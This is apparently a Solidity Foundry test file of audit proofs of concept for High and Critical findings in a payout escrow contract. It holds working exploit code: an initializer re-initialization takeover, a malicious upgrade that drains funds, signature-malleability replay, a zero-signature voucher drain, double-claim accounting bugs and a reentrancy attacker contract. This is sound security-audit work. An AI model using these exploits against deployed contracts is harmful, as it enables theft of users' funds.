// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {LegacyPayouts} from "../../src/audit/LegacyPayouts.sol";
import {USDX, FOTX} from "../../src/tokens/MockTokens.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice PoCs for High/Critical findings in LegacyPayouts.
contract LegacyPayoutsPoC is Test {
    LegacyPayouts internal impl;
    LegacyPayouts internal payouts;
    USDX internal usdx;

    address internal owner = makeAddr("owner");
    address internal operator = makeAddr("operator");
    address internal guardian = makeAddr("guardian");
    address internal treasury = makeAddr("treasury");
    address internal brand = makeAddr("brand");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");

    uint256 internal operatorPk = 0x0B1;
    address internal operatorSigner;

    function setUp() public {
        operatorSigner = vm.addr(operatorPk);
        operator = operatorSigner;

        impl = new LegacyPayouts();
        bytes memory init = abi.encodeCall(LegacyPayouts.initialize, (owner, operator, guardian, treasury, 1000));
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), init);
        payouts = LegacyPayouts(address(proxy));
        usdx = new USDX();
    }

    function _fund(uint256 amount) internal returns (uint256 id) {
        usdx.mint(brand, amount);
        vm.startPrank(brand);
        usdx.approve(address(payouts), amount);
        id = payouts.fund(IERC20(address(usdx)), amount, uint64(block.timestamp + 30 days));
        vm.stopPrank();
    }

    /// @notice C-01: initialize lacks initializer guard — hijack uninitialized impl or re-init proxy if exposed.
    function test_C01_uninitializedImplementation_takeover() public {
        LegacyPayouts naked = new LegacyPayouts();
        // Anyone can initialize the implementation directly and become owner, then upgrade via UUPS if used as proxy target incorrectly
        naked.initialize(address(this), address(this), address(this), address(this), 0);
        assertEq(naked.owner(), address(this));
    }

    /// @notice H-01: proposeRoot commits immediately; veto does not roll back commitment — drains budget / blocks refunds.
    function test_H01_vetoLeavesInflatedCommitment() public {
        uint256 id = _fund(1_000_000);
        vm.prank(operator);
        payouts.proposeRoot(id, keccak256("evil"), 1_000_000);

        vm.prank(guardian);
        payouts.vetoRoot(id);

        (,,,, uint256 committed,,,,) = _campaign(id);
        // Commitment stuck at 1_000_000 even though root was vetoed
        assertEq(committed, 1_000_000);

        // Brand cannot refund: amount = budget - (committed - claimed) = 0
        vm.warp(block.timestamp + 30 days + 1 hours);
        vm.prank(brand);
        vm.expectRevert("nothing to refund");
        payouts.refund(id);
    }

    /// @notice H-02: claim accounts net-after-fee into `claimed` while leaf is gross — double-claim inflation.
    function test_H02_claimFeeAccountingDoublePay() public {
        uint256 id = _fund(10_000_000);
        uint256 cum = 1_000_000;
        bytes32 leaf = keccak256(abi.encodePacked(id, alice, cum));
        vm.prank(operator);
        payouts.proposeRoot(id, leaf, cum);
        vm.warp(block.timestamp + 1 hours);
        payouts.activateRoot(id);

        bytes32[] memory proof = new bytes32[](0);
        vm.prank(alice);
        payouts.claim(id, cum, proof);

        uint256 claimedRecord = payouts.claimed(id, alice);
        // feeBps=1000 → 10%; claimed stores net (900k) not gross (1M)
        assertEq(claimedRecord, 900_000);

        // Alice can claim again for the fee gap: payout = cum - claimed = 100k
        vm.prank(alice);
        payouts.claim(id, cum, proof);
        assertGt(usdx.balanceOf(alice), 900_000);
    }

    /// @notice H-03: migrateCreator lets a user clear their claim record and re-claim.
    function test_H03_migrateCreatorDoubleClaim() public {
        uint256 id = _fund(10_000_000);
        uint256 cum = 1_000_000;
        bytes32 leaf = keccak256(abi.encodePacked(id, alice, cum));
        vm.prank(operator);
        payouts.proposeRoot(id, leaf, cum);
        vm.warp(block.timestamp + 1 hours);
        payouts.activateRoot(id);

        bytes32[] memory proof = new bytes32[](0);
        vm.prank(alice);
        payouts.claim(id, cum, proof);

        address alice2 = makeAddr("alice2");
        vm.prank(alice);
        payouts.migrateCreator(id, alice2);
        assertEq(payouts.claimed(id, alice), 0);

        // Alice claims again from zeroed record
        vm.prank(alice);
        payouts.claim(id, cum, proof);
        assertGt(usdx.balanceOf(alice), 900_000);
    }

    /// @notice H-04: topUp credits `amount` not received — FOTX drains solvency.
    function test_H04_topUpIgnoresFeeOnTransfer() public {
        FOTX fotx = new FOTX();
        fotx.mint(brand, 1_000_000);
        vm.startPrank(brand);
        fotx.approve(address(payouts), 1_000_000);
        uint256 id = payouts.fund(IERC20(address(fotx)), 1_000_000, uint64(block.timestamp + 30 days));
        // received 990_000
        fotx.mint(brand, 1_000_000);
        fotx.approve(address(payouts), 1_000_000);
        payouts.topUp(id, 1_000_000);
        vm.stopPrank();

        (,,, uint256 budget,,,,,) = _campaign(id);
        // budget inflated vs actual balance
        uint256 bal = fotx.balanceOf(address(payouts));
        assertGt(budget, bal);
    }

    /// @notice H-05: voucher keyed by signature hash — malleable secp256k1 s allows replay.
    function test_H05_voucherSignatureMalleability() public {
        uint256 id = _fund(5_000_000);
        uint256 amount = 100_000;
        uint256 nonce = 1;
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19Ethereum Signed Message:\n32",
                keccak256(abi.encode(block.chainid, address(payouts), id, alice, amount, nonce))
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operatorPk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        payouts.redeemVoucher(id, alice, amount, nonce, sig);

        // malleate s
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 s2 = bytes32(n - uint256(s));
        uint8 v2 = v == 27 ? 28 : 27;
        bytes memory sig2 = abi.encodePacked(r, s2, v2);

        // Second redeem with malleated sig — usedVouchers keyed by sig hash, not digest
        payouts.redeemVoucher(id, alice, amount, nonce, sig2);
        assertGe(usdx.balanceOf(alice), amount);
    }

    /// @notice C-01b: re-initialize an already-initialized proxy and seize upgrade + funds path.
    function test_C01_proxyReinitialize_takeoverFunds() public {
        uint256 id = _fund(1_000_000);
        // No initializer guard — attacker re-inits the live proxy
        payouts.initialize(address(this), address(this), address(this), address(this), 0);
        assertEq(payouts.owner(), address(this));

        // Owner can upgrade to empty impl and/or operate as operator; demonstrate fund control via upgrade auth
        EmptyPayouts empty = new EmptyPayouts();
        payouts.upgradeToAndCall(address(empty), "");
        // After upgrade, original campaign storage still holds tokens; empty impl exposes drain
        EmptyPayouts(address(payouts)).drain(IERC20(address(usdx)), address(this));
        assertEq(usdx.balanceOf(address(this)), 1_000_000);
        assertEq(usdx.balanceOf(address(payouts)), 0);
        id; // silence
    }

    /// @notice Critical: revokeOperator → operator=0; malformed 65-byte sig recovers address(0) and drains vouchers.
    function test_E3_zeroOperator_malformedSigVoucherDrain() public {
        uint256 id = _fund(2_000_000);
        vm.prank(guardian);
        payouts.revokeOperator();
        assertEq(payouts.operator(), address(0));

        // 65 zero bytes → ecrecover returns address(0) == operator
        bytes memory sig = new bytes(65);
        uint256 amount = 500_000;
        payouts.redeemVoucher(id, alice, amount, 99, sig);
        assertGt(usdx.balanceOf(alice), 0);
    }

    /// @notice Unchecked topUp: token returns false; budget still increases (no tokens pulled).
    function test_M01_topUpFalseReturn_inflatesBudget() public {
        FalseReturnERC20 tok = new FalseReturnERC20();
        tok.mint(brand, 5_000_000);
        // fund uses require(transferFrom) — need a successful fund first with USDX, then topUp with false token? 
        // topUp uses campaign token. So fund with FalseReturn that succeeds once then fails.
        FlipReturnERC20 flip = new FlipReturnERC20();
        flip.mint(brand, 5_000_000);
        vm.startPrank(brand);
        flip.approve(address(payouts), type(uint256).max);
        uint256 id = payouts.fund(IERC20(address(flip)), 1_000_000, uint64(block.timestamp + 30 days));
        flip.setFail(true);
        uint256 balBefore = flip.balanceOf(address(payouts));
        payouts.topUp(id, 1_000_000); // ignores false return
        vm.stopPrank();
        (,,, uint256 budget,,,,,) = _campaign(id);
        assertEq(flip.balanceOf(address(payouts)), balBefore);
        assertEq(budget, 2_000_000); // inflated by 1e6 with no tokens
    }

    /// @notice Claim does not reduce budget; refund can pull other campaigns' shared token liquidity.
    function test_S1_crossCampaignRefundTheft() public {
        uint256 id1 = _fund(1_000_000);
        uint256 id2 = _fund(1_000_000);
        // Commit and pay almost all of campaign 1 without reducing budget
        uint256 cum = 900_000;
        bytes32 leaf = keccak256(abi.encodePacked(id1, alice, cum));
        vm.prank(operator);
        payouts.proposeRoot(id1, leaf, cum);
        vm.warp(block.timestamp + 1 hours);
        payouts.activateRoot(id1);
        bytes32[] memory proof = new bytes32[](0);
        vm.prank(alice);
        payouts.claim(id1, cum, proof);

        // budget still 1e6; committed=cum; claimedTotal≈900k gross path uses net in claimed but claimedTotal += payout gross
        // refund amount = budget - (committed - claimedTotal) ≈ 1e6 - (900k - 900k) = 1e6 if claimedTotal tracks payout
        vm.warp(block.timestamp + 30 days + 1 hours);
        uint256 brandBalBefore = usdx.balanceOf(brand);
        vm.prank(brand);
        payouts.refund(id1);
        uint256 refunded = usdx.balanceOf(brand) - brandBalBefore;
        // Escrow held 2e6; after claim ~810k net left to alice + fees; refund can exceed campaign-1 residual and eat campaign-2
        assertGt(refunded, 100_000);
        // Campaign 2 still shows full budget but tokens may be insufficient for its creators
        uint256 escrowBal = usdx.balanceOf(address(payouts));
        (,,, uint256 budget2, uint256 committed2,,,,) = _campaign(id2);
        assertEq(budget2, 1_000_000);
        assertEq(committed2, 0);
        assertLt(escrowBal, budget2); // shared pool insolvent vs campaign-2 books
        id2;
    }

    /// @notice Missing claim vs commitment ceiling: leaf payouts exceed committed and drain shared liquidity.
    function test_F2_claimAboveCommitment_drainsSharedLiquidity() public {
        uint256 id1 = _fund(1_000_000);
        uint256 id2 = _fund(1_000_000);
        // Commit only 100k but leaf says 1M
        uint256 cum = 1_000_000;
        bytes32 leaf = keccak256(abi.encodePacked(id1, alice, cum));
        vm.prank(operator);
        payouts.proposeRoot(id1, leaf, 100_000);
        vm.warp(block.timestamp + 1 hours);
        payouts.activateRoot(id1);
        bytes32[] memory proof = new bytes32[](0);
        vm.prank(alice);
        payouts.claim(id1, cum, proof); // no ClaimedExceedsCommitted check
        // Paid ~900k net though commitment was only 100k — consumes shared pool
        assertGe(usdx.balanceOf(alice), 800_000);
        assertLt(usdx.balanceOf(address(payouts)), 2_000_000 - 100_000);
        id2;
    }

    /// @notice Funding reentrancy: outer balance-delta includes inner deposit → double budget credit.
    function test_F1_fundReentrancy_doubleCredit() public {
        ReentrantFundToken tok = new ReentrantFundToken();
        FundReenter attacker = new FundReenter(payouts, tok);
        tok.mint(address(attacker), 2_000_000);
        attacker.attack(1_000_000, uint64(block.timestamp + 30 days));
        // Two campaigns created; sum of budgets > tokens received
        uint256 bal = tok.balanceOf(address(payouts));
        (,,, uint256 b0,,,,,) = _campaign(0);
        (,,, uint256 b1,,,,,) = _campaign(1);
        assertGt(b0 + b1, bal);
    }

    function _campaign(uint256 id)
        internal
        view
        returns (
            address brand_,
            IERC20 token,
            uint64 endTime,
            uint256 budget,
            uint256 committed,
            uint256 claimedTotal,
            bytes32 root,
            bytes32 pendingRoot,
            uint64 pendingAt
        )
    {
        return payouts.campaigns(id);
    }
}

/// @dev Malicious upgraded implementation that drains ERC20 balances.
contract EmptyPayouts is UUPSUpgradeable {
    function drain(IERC20 token, address to) external {
        token.transfer(to, token.balanceOf(address(this)));
    }

    function _authorizeUpgrade(address) internal override {}
}

contract FalseReturnERC20 is IERC20 {
    string public constant name = "FALSE";
    string public constant symbol = "FALSE";
    uint8 public constant decimals = 6;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address, uint256) external pure override returns (bool) {
        return false;
    }

    function transferFrom(address, address, uint256) external pure override returns (bool) {
        return false;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev First transferFrom succeeds; subsequent return false without moving tokens.
contract FlipReturnERC20 is IERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;
    bool public fail;

    function setFail(bool v) external {
        fail = v;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        if (fail) return false;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        if (fail) return false;
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract ReentrantFundToken is IERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;
    address public reenterTarget;
    bool internal entered;

    function setReenter(address t) external {
        reenterTarget = t;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        if (reenterTarget != address(0) && !entered) {
            entered = true;
            FundReenter(reenterTarget).onTransfer();
            entered = false;
        }
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract FundReenter {
    LegacyPayouts public immutable payouts;
    ReentrantFundToken public immutable tok;
    bool public again;

    constructor(LegacyPayouts p, ReentrantFundToken t) {
        payouts = p;
        tok = t;
    }

    function attack(uint256 amount, uint64 endTime) external {
        tok.approve(address(payouts), type(uint256).max);
        tok.setReenter(address(this));
        payouts.fund(IERC20(address(tok)), amount, endTime);
    }

    function onTransfer() external {
        if (!again) {
            again = true;
            payouts.fund(IERC20(address(tok)), 500_000, uint64(block.timestamp + 30 days));
        }
    }
}
